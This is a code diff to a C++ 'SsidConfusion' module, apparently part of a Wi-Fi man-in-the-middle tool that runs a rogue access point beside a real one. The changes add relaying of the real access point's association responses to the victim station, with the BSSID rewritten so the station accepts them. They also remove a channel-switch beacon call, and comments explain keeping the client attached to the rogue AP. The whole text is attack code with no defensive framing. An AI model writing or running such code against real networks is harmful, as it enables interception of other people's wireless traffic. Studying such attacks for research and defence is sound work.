@@ -79,7 +79,6 @@ FrameProcess SsidConfusion::handle_probe_real(const HWAddress<6> addr2, const Do
 	if(dot11.find_pdu<Dot11ProbeRequest>() || dot11.find_pdu<Dot11ProbeResponse>()){
 		if(addr2 == sta.get(SK::mac)){
 			display_traffic(dot11, "Real channel", " -- send CSA");
-			send_csa_beacon();
 			client_state.update_state(ClientState::Sent_to_rogue);
 		}
 		return STOP;
@@ -121,9 +120,17 @@ void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const f
 		return; // don't relay real AP beacons
 	}
 
-	// don't relay real AP auth/assoc responses - client already got our local replies
-	if(dot11->find_pdu<Dot11AssocResponse>() || dot11->find_pdu<Dot11ReAssocResponse>()
-	   || dot11->find_pdu<Dot11Authentication>()) return;
+	// relay real AP assoc response back to STA (rewrite BSSID so STA accepts it)
+	if(dot11->find_pdu<Dot11AssocResponse>() || dot11->find_pdu<Dot11ReAssocResponse>()) {
+		if(addr1 == HWAddress<6>(sta.get(SK::mac))) {
+			auto relayed = ensure_radiotap(raw);
+			rewrite_bssid_in_frame(relayed, rogue_ap.get(SK::mac));
+			display_traffic(*dot11, "Real channel", " assoc resp -- relay to rogue");
+			send_to_rogue(relayed);
+		}
+		return;
+	}
+	if(dot11->find_pdu<Dot11Authentication>()) return;
 
 	// don't relay deauth/disassoc from real AP - would disconnect client from rogue AP
 	if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()) return;
